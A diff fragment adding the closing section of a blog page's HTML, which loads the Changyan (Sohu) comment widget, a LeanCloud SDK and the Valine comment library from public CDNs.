+      window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){
+        window.changyan.api.config({appid:appid,conf:conf})});
+      }
+    })();
+    </script>
+    <script type="text/javascript" src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js"></script>
+  
+
+
+
+
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
